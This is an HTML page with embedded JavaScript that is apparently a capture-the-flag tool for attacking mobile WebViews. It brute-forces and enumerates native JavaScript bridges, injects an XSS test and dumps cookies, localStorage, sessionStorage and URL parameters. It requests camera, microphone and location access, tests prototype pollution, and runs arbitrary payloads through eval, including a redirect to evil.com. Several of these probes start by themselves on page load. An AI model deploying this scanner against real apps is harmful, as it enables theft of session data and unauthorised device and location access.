<!DOCTYPE html>
<html>
<head>
    <title>Enhanced WebView CTF Scanner</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            padding: 20px;
            background: #000;
            color: #00ff00;
            margin: 0;
            font-size: 12px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0,20,0,0.9);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
        }
        .section {
            background: rgba(0,40,0,0.3);
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 3px solid #ff0000;
        }
        .success { border-left-color: #00ff00; }
        .warning { border-left-color: #ffff00; }
        .info { border-left-color: #0099ff; }
        .critical { border-left-color: #ff0000; }
        button {
            background: #004400;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
            margin: 3px;
            font-family: inherit;
            font-size: 11px;
        }
        button:hover { background: #006600; }
        .code {
            background: #001100;
            padding: 10px;
            border-radius: 3px;
            font-family: inherit;
            margin: 5px 0;
            overflow-x: auto;
            font-size: 11px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #003300;
        }
        .exploit { color: #ff4444; font-weight: bold; }
        .found { color: #ffff00; }
        .data { color: #44ffff; }
        .hidden { display: none; }
        input {
            background: #001100;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 5px;
            font-family: inherit;
            margin: 3px;
        }
        .live-log {
            height: 200px;
            overflow-y: auto;
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            font-size: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>[+] Enhanced WebView CTF Scanner v2.0</h1>
        <div id="liveLog" class="live-log"></div>
        
        <div class="section critical">
            <h2>[!] Real Interface Discovery</h2>
            <button onclick="scanRealInterfaces()">Scan Real Interfaces</button>
            <button onclick="testXSS()">Test XSS Vectors</button>
            <button onclick="extractData()">Extract All Data</button>
            <button onclick="testMediaAccess()">Test Media Access</button>
            <div id="realResults"></div>
        </div>

        <div class="section warning">
            <h2>[*] Advanced Enumeration</h2>
            <button onclick="bruteForceInterfaces()">Brute Force Interfaces</button>
            <button onclick="testPrototypeChain()">Test Prototype Chain</button>
            <button onclick="scanServiceWorkers()">Scan Service Workers</button>
            <div id="advancedResults"></div>
        </div>

        <div class="section info">
            <h2>[+] Payload Testing</h2>
            <input type="text" id="payloadInput" placeholder="Enter custom payload" style="width: 60%;">
            <button onclick="testPayload()">Execute Payload</button>
            <button onclick="testCommonPayloads()">Test Common Payloads</button>
            <div id="payloadResults"></div>
        </div>

        <div class="section success">
            <h2>[+] Data Extraction Results</h2>
            <div id="dataResults"></div>
        </div>
    </div>

    <script>
        let logDiv = document.getElementById('liveLog');
        let realInterfaces = [];
        let sensitiveData = {};

        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                'info': '#00ff00',
                'warning': '#ffff00', 
                'error': '#ff0000',
                'success': '#44ff44',
                'data': '#44ffff'
            };
            
            logDiv.innerHTML += `<div style="color: ${colors[type] || '#00ff00'}">[${timestamp}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(message);
        }

        function scanRealInterfaces() {
            log('[+] Starting real interface discovery...', 'info');
            const resultsDiv = document.getElementById('realResults');
            let results = '';
            let foundCount = 0;

            // Filter out our own functions to avoid false positives
            const ourFunctions = [
                'quickScan', 'deepScan', 'findHiddenAPIs', 'testCommonInterfaces', 
                'testInterface', 'analyzeEnvironment', 'generateReport', 'log',
                'scanRealInterfaces', 'testXSS', 'extractData', 'testMediaAccess',
                'bruteForceInterfaces', 'testPrototypeChain', 'scanServiceWorkers',
                'testPayload', 'testCommonPayloads'
            ];

            // Real interface discovery
            const realTargets = [
                'Android', 'webkit', 'app', 'bridge', 'nativeApp', 'mobile',
                'ctf', 'ctfapp', 'CTF', 'CTFAPP', 'native', 'client',
                'AppInterface', 'NativeBridge', 'WebViewInterface', 'JSInterface',
                'NativeInterface', 'AppBridge', 'MobileBridge', 'CTFInterface'
            ];

            realTargets.forEach(name => {
                if (window[name] && typeof window[name] === 'object') {
                    log(`[!] REAL INTERFACE FOUND: ${name}`, 'error');
                    results += `<div class="exploit">[!] ${name} - REAL INTERFACE!</div>`;
                    realInterfaces.push(name);
                    foundCount++;

                    // Enumerate methods
                    try {
                        const methods = Object.getOwnPropertyNames(window[name]);
                        methods.forEach(method => {
                            if (typeof window[name][method] === 'function') {
                                log(`  [+] Method: ${name}.${method}()`, 'warning');
                                results += `<div class="found">  [+] ${name}.${method}()</div>`;
                            }
                        });
                    } catch (e) {
                        log(`  [!] Error enumerating ${name}: ${e.message}`, 'error');
                    }
                }
            });

            // Check webkit message handlers (iOS)
            if (window.webkit && window.webkit.messageHandlers) {
                log('[!] WEBKIT MESSAGE HANDLERS FOUND!', 'error');
                results += `<div class="exploit">[!] webkit.messageHandlers - iOS INTERFACE!</div>`;
                const handlers = Object.keys(window.webkit.messageHandlers);
                handlers.forEach(handler => {
                    log(`  [+] Handler: ${handler}`, 'warning');
                    results += `<div class="found">  [+] Handler: ${handler}</div>`;
                    foundCount++;
                });
            }

            // Scan window properties more intelligently
            for (let prop in window) {
                if (ourFunctions.includes(prop)) continue;
                
                try {
                    const value = window[prop];
                    const type = typeof value;
                    
                    // Look for custom objects with methods
                    if (type === 'object' && value !== null && value !== window && value !== document) {
                        const methods = Object.getOwnPropertyNames(value).filter(p => {
                            try {
                                return typeof value[p] === 'function' && !p.startsWith('_');
                            } catch {
                                return false;
                            }
                        });
                        
                        if (methods.length > 0 && methods.length < 50) {
                            // Exclude common DOM objects
                            if (!value.nodeType && !value.toString().includes('[object HTML') && 
                                !value.toString().includes('[object CSS') &&
                                prop !== 'console' && prop !== 'navigator' && prop !== 'location') {
                                
                                log(`[?] Suspicious object: ${prop} (${methods.length} methods)`, 'warning');
                                results += `<div class="found">[?] ${prop}: ${methods.slice(0,5).join(', ')}${methods.length > 5 ? '...' : ''}</div>`;
                            }
                        }
                    }
                } catch (e) {
                    // Access restricted - potentially interesting
                    log(`[!] Restricted property: ${prop}`, 'error');
                }
            }

            if (foundCount === 0) {
                results += '<div>[+] No obvious interfaces found - app may use indirect communication</div>';
                log('[+] No obvious interfaces found', 'info');
            }

            resultsDiv.innerHTML = results;
        }

        function testXSS() {
            log('[+] Testing XSS vectors...', 'info');
            const resultsDiv = document.getElementById('realResults');
            
            // Test basic XSS
            try {
                const xssTest = document.createElement('div');
                xssTest.innerHTML = '<img src=x onerror=console.log("XSS_WORKS")>';
                document.body.appendChild(xssTest);
                log('[+] Basic XSS payload injected', 'success');
                
                // Test if we can access parent frames
                try {
                    if (window.parent !== window) {
                        log('[!] Frame detected - testing parent access', 'warning');
                        try {
                            const parentDomain = window.parent.location.href;
                            log(`[!] Parent accessible: ${parentDomain}`, 'error');
                        } catch (e) {
                            log('[+] Parent blocked by CORS', 'info');
                        }
                    }
                } catch (e) {}
                
                document.body.removeChild(xssTest);
            } catch (e) {
                log(`[!] XSS blocked: ${e.message}`, 'warning');
            }
        }

        function extractData() {
            log('[+] Extracting all available data...', 'info');
            const resultsDiv = document.getElementById('dataResults');
            let dataOutput = '';

            // Extract localStorage
            try {
                if (typeof localStorage !== 'undefined') {
                    log('[+] Dumping localStorage...', 'data');
                    dataOutput += '<div class="data">[+] LOCAL STORAGE:</div>';
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        log(`  ${key}: ${value}`, 'data');
                        dataOutput += `<div class="code">${key}: ${value}</div>`;
                    }
                    if (localStorage.length === 0) {
                        dataOutput += '<div>  [empty]</div>';
                    }
                }
            } catch (e) {
                log(`[!] localStorage error: ${e.message}`, 'error');
            }

            // Extract sessionStorage
            try {
                if (typeof sessionStorage !== 'undefined') {
                    log('[+] Dumping sessionStorage...', 'data');
                    dataOutput += '<div class="data">[+] SESSION STORAGE:</div>';
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        log(`  ${key}: ${value}`, 'data');
                        dataOutput += `<div class="code">${key}: ${value}</div>`;
                    }
                    if (sessionStorage.length === 0) {
                        dataOutput += '<div>  [empty]</div>';
                    }
                }
            } catch (e) {
                log(`[!] sessionStorage error: ${e.message}`, 'error');
            }

            // Extract cookies
            try {
                log('[+] Dumping cookies...', 'data');
                dataOutput += '<div class="data">[+] COOKIES:</div>';
                if (document.cookie) {
                    const cookies = document.cookie.split(';');
                    cookies.forEach(cookie => {
                        log(`  ${cookie.trim()}`, 'data');
                        dataOutput += `<div class="code">${cookie.trim()}</div>`;
                    });
                } else {
                    dataOutput += '<div>  [no cookies]</div>';
                }
            } catch (e) {
                log(`[!] Cookie error: ${e.message}`, 'error');
            }

            // Extract URL parameters
            try {
                log('[+] Dumping URL parameters...', 'data');
                dataOutput += '<div class="data">[+] URL PARAMETERS:</div>';
                const params = new URLSearchParams(window.location.search);
                let hasParams = false;
                for (const [key, value] of params) {
                    log(`  ${key}: ${value}`, 'data');
                    dataOutput += `<div class="code">${key}: ${value}</div>`;
                    hasParams = true;
                }
                if (!hasParams) {
                    dataOutput += '<div>  [no parameters]</div>';
                }
            } catch (e) {
                log(`[!] URL parameter error: ${e.message}`, 'error');
            }

            resultsDiv.innerHTML = dataOutput;
        }

        function testMediaAccess() {
            log('[+] Testing media device access...', 'info');
            
            // Test camera access
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                log('[!] getUserMedia available - testing camera...', 'warning');
                
                navigator.mediaDevices.getUserMedia({video: true, audio: true})
                    .then(stream => {
                        log('[!] CAMERA ACCESS GRANTED!', 'error');
                        // Stop the stream immediately
                        stream.getTracks().forEach(track => track.stop());
                    })
                    .catch(err => {
                        log(`[+] Camera access denied: ${err.message}`, 'info');
                    });
            }

            // Test geolocation
            if (navigator.geolocation) {
                log('[!] Geolocation available - testing...', 'warning');
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        log(`[!] LOCATION OBTAINED: ${position.coords.latitude}, ${position.coords.longitude}`, 'error');
                    },
                    error => {
                        log(`[+] Geolocation denied: ${error.message}`, 'info');
                    },
                    {timeout: 5000}
                );
            }

            // Test device motion
            if (typeof DeviceMotionEvent !== 'undefined') {
                log('[!] DeviceMotionEvent available', 'warning');
                window.addEventListener('devicemotion', (event) => {
                    log(`[!] DEVICE MOTION: x=${event.acceleration.x}`, 'error');
                }, {once: true});
            }
        }

        function bruteForceInterfaces() {
            log('[+] Brute forcing interface names...', 'info');
            const resultsDiv = document.getElementById('advancedResults');
            let results = '';

            // Common interface name patterns
            const prefixes = ['', 'app', 'native', 'ctf', 'mobile', 'bridge', 'interface', 'api'];
            const suffixes = ['', 'Interface', 'Bridge', 'API', 'App', 'Native', 'Handler'];
            const words = ['CTF', 'App', 'Native', 'Bridge', 'Interface', 'API', 'Handler', 'Client', 'Service'];

            const combinations = [];
            
            // Generate combinations
            prefixes.forEach(prefix => {
                words.forEach(word => {
                    suffixes.forEach(suffix => {
                        const name = prefix + word + suffix;
                        if (name && name.length > 2) {
                            combinations.push(name);
                        }
                    });
                });
            });

            // Test each combination
            let found = 0;
            combinations.forEach(name => {
                if (window[name] && typeof window[name] === 'object') {
                    log(`[!] BRUTE FORCE HIT: ${name}`, 'error');
                    results += `<div class="exploit">[!] FOUND: ${name}</div>`;
                    found++;
                }
            });

            if (found === 0) {
                results += '<div>[+] No interfaces found via brute force</div>';
            }

            resultsDiv.innerHTML = results;
        }

        function testPrototypeChain() {
            log('[+] Testing prototype chain pollution...', 'info');
            
            try {
                // Test if we can pollute prototypes
                Object.prototype.polluted = 'test';
                if (({}).polluted === 'test') {
                    log('[!] PROTOTYPE POLLUTION POSSIBLE!', 'error');
                    delete Object.prototype.polluted;
                }
            } catch (e) {
                log(`[+] Prototype pollution blocked: ${e.message}`, 'info');
            }

            // Check for extended prototypes
            const prototypes = [Window, Document, HTMLElement, Navigator];
            prototypes.forEach(proto => {
                const props = Object.getOwnPropertyNames(proto.prototype);
                props.forEach(prop => {
                    if (/app|native|bridge|ctf|interface/i.test(prop)) {
                        log(`[!] Extended prototype: ${proto.name}.${prop}`, 'warning');
                    }
                });
            });
        }

        function testPayload() {
            const payload = document.getElementById('payloadInput').value;
            if (!payload) return;
            
            log(`[+] Testing payload: ${payload}`, 'info');
            
            try {
                const result = eval(payload);
                log(`[+] Payload result: ${result}`, 'success');
            } catch (e) {
                log(`[!] Payload error: ${e.message}`, 'error');
            }
        }

        function testCommonPayloads() {
            log('[+] Testing common exploit payloads...', 'info');
            
            const payloads = [
                'window.location = "http://evil.com"',
                'document.cookie',
                'navigator.userAgent',
                'window.history.length',
                'screen.width + "x" + screen.height',
                'Object.keys(window).length'
            ];

            payloads.forEach(payload => {
                try {
                    const result = eval(payload);
                    log(`[+] ${payload} = ${result}`, 'data');
                } catch (e) {
                    log(`[!] ${payload} failed: ${e.message}`, 'error');
                }
            });
        }

        // Auto-run on load
        window.onload = function() {
            log('[+] Enhanced WebView CTF Scanner loaded', 'success');
            log('[+] Ready for exploitation...', 'info');
            
            // Auto-run basic scans
            setTimeout(() => {
                scanRealInterfaces();
                extractData();
                testMediaAccess();
            }, 1000);
        };
    </script>
</body>
</html>
